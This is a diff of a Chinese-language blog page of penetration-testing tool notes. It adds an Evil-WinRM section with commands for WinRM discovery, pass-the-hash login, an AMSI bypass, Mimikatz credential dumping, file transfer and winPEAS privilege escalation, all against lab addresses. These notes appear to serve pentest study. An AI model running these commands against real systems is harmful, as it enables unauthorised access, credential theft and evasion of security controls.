@@ -18,8 +18,9 @@
 <meta property="og:image" content="https://superhuabigcake.github.io/2023/06/27/Attack-Tools/image-20230828162920555.png">
 <meta property="og:image" content="https://superhuabigcake.github.io/2023/06/27/Attack-Tools/image-20231123112217476.png">
 <meta property="og:image" content="https://superhuabigcake.github.io/2023/06/27/Attack-Tools/image-20231123112437220.png">
+<meta property="og:image" content="https://superhuabigcake.github.io/2023/06/27/Attack-Tools/image-20240126144101372.png">
 <meta property="article:published_time" content="2023-06-27T10:58:32.000Z">
-<meta property="article:modified_time" content="2023-11-23T03:24:42.930Z">
+<meta property="article:modified_time" content="2024-01-26T06:52:43.996Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="Tools">
 <meta name="twitter:card" content="summary">
@@ -405,7 +406,7 @@
 </code></pre>
 <pre><code class="bash">httpx.exe -up
 </code></pre>
-<h2 id="katana"><a href="#katana" class="headerlink" title="katana"></a>katana</h2><p>网络爬虫框架工具</p>
+<h2 id="Katana"><a href="#Katana" class="headerlink" title="Katana"></a>Katana</h2><p>网络爬虫框架工具</p>
 <blockquote>
 <p><a target="_blank" rel="noopener" href="https://github.com/projectdiscovery/katana">https://github.com/projectdiscovery/katana</a></p>
 </blockquote>
@@ -423,6 +424,65 @@
 <pre><code class="cnd">katana.exe -u http://192.168.43.19/ -jc -kf -aff -o katana.txt | findstr &quot;?&quot;
 </code></pre>
 <p><img src="/2023/06/27/Attack-Tools/image-20231123112437220.png" alt="image-20231123112437220"></p>
+<h2 id="Evil-Winrm"><a href="#Evil-Winrm" class="headerlink" title="Evil-Winrm"></a>Evil-Winrm</h2><p>Evil-winrm使用PowerShell远程协议，且系统和网络管理员经常使用Windows Remote Management协议进行上传和管理。WinRM 是一种基于对防火墙友好的SOAP协议，可通过HTTP默认端口5985与HTTP传输一起使用</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</a></p>
+</blockquote>
+<ul>
+<li>Winrm服务发现</li>
+</ul>
+<pre><code class="bash">nmap -p5985,5986 192.168.52.140
+</code></pre>
+<p><img src="/2023/06/27/Attack-Tools/image-20240126144101372.png" alt="image-20240126144101372"></p>
+<ul>
+<li>使用明文密码登录</li>
+</ul>
+<pre><code class="bash">evil-winrm -i 192.168.1.19 -u administrator -p &#39;Ignite@987&#39;
+</code></pre>
+<ul>
+<li>使用明文密码登录并启用SSL</li>
+</ul>
+<pre><code class="bash">evil-winrm -i 192.168.1.19 -u administrator -p &#39;Ignite@987&#39; -S
+</code></pre>
+<ul>
+<li>使用HTLM Hash登录</li>
+</ul>
+<pre><code class="bash">evil-winrm -i 192.168.1.19 -u administrator -H 32196B56FFE6F45E294117B91A83BF38
+</code></pre>
+<ul>
+<li>内存加载Powershell脚本</li>
+</ul>
+<pre><code class="bash">evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -s /opt/privsc/powershell
+</code></pre>
+<blockquote>
+<p>powershell 脚本文件存放在 &#x2F;opt&#x2F;privsc&#x2F;powershell 目录下</p>
+</blockquote>
+<pre><code>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; Bypass-4MSI
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; Invoke-Mimikatz.ps1
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; Invoke-Mimikatz
+</code></pre>
+<ul>
+<li>上传文件</li>
+</ul>
+<pre><code class="bash">*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; upload /root/flag.txt .
+</code></pre>
+<ul>
+<li>下载文件</li>
+</ul>
+<pre><code class="bash">*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; download flag.txt /root/flag.txt
+</code></pre>
+<ul>
+<li>执行可执行文件</li>
+</ul>
+<pre><code class="bash">evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -e /opt/privsc
+</code></pre>
+<blockquote>
+<p>可执行文件存放在 &#x2F;opt&#x2F;privsc 目录下</p>
+</blockquote>
+<pre><code>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; Bypass-4MSI
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; menu
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; Invoke-Binary /opt/privsc/winPEASx64.exe
+</code></pre>
 
     </div>
 </article>
